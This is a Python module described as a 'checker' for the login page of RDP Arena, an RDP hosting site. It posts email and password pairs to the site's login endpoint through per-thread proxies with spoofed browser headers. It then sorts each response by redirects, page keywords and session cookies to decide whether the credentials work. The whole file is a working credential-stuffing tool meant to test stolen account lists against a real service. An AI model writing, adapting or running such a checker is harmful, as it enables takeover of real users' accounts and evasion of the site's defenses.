"""
Checker for RDP Arena (www.rdparena.com) – Debug‑ready & improved success detection.
"""
import requests
import threading
from typing import Tuple

BASE_URL = "https://www.rdparena.com/"
LOGIN_URL = BASE_URL + "payments/login"
TIMEOUT = 15

# Set to True to print debug info (for testing)
DEBUG = False

def check(email: str, password: str) -> Tuple[bool, str]:
    proxy = getattr(threading.current_thread(), 'proxy', None)

    session = requests.Session()
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}

    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Origin": BASE_URL,
        "Referer": BASE_URL
    })

    try:
        payload = {"email": email, "password": password}   # Try email first
        # If that fails, you can add fallback field names.

        response = session.post(LOGIN_URL, data=payload, timeout=TIMEOUT, allow_redirects=False)

        if DEBUG:
            print(f"[DEBUG] Status: {response.status_code}")
            print(f"[DEBUG] Headers: {response.headers}")
            print(f"[DEBUG] Cookies: {session.cookies.get_dict()}")
            print(f"[DEBUG] Body (first 300): {response.text[:300]}")

        # ---------- Success detection ----------

        # 1. Redirect – treat as success unless the redirect goes to login page
        if response.status_code in (301, 302):
            location = response.headers.get("Location", "")
            # If the redirect goes back to login or contains 'login' – it's a failure
            if "login" in location.lower() or "signin" in location.lower():
                return False, f"Redirected back to login: {location}"
            # Otherwise, assume success
            return True, f"Login successful (redirect to {location})"

        # 2. HTTP 200 – inspect content
        if response.status_code == 200:
            html = response.text.lower()
            # Check for explicit error messages
            error_phrases = ["invalid", "incorrect", "error", "failed", "wrong", "not found", "password", "username"]
            has_error = any(phrase in html for phrase in error_phrases)

            # Check for success keywords
            success_phrases = ["dashboard", "logout", "welcome", "account", "my account", "profile"]
            has_success = any(phrase in html for phrase in success_phrases)

            # Check for login form (presence of password field)
            has_login_form = 'name="password"' in html or 'type="password"' in html

            # Decide
            if has_success:
                return True, "Login successful (content marker)"
            if has_error:
                return False, "Login failed (error message found)"
            if has_login_form and not has_success:
                # Probably still on login page, but no explicit error
                return False, "Login failed (login form still present)"
            # If no clear success, but also no error or form, maybe success (but cautious)
            # Check for session cookie as a strong indicator
            if session.cookies.get_dict():
                return True, "Login successful (session cookie set)"
            # If we have a cookie named 'PHPSESSID' or similar, treat as success
            if any(cookie in session.cookies for cookie in ['PHPSESSID', 'user_id', 'session', 'auth']):
                return True, "Login successful (session cookie present)"

            # Fallback: ambiguous
            return False, "Login response ambiguous (treated as failure)"

        # 3. Other status codes (403, 500, etc.)
        else:
            return False, f"HTTP {response.status_code}: {response.reason}"

    except requests.exceptions.Timeout:
        return False, "Request timed out"
    except requests.exceptions.ConnectionError:
        return False, "Connection error"
    except Exception as e:
        return False, f"Unexpected error: {str(e)}"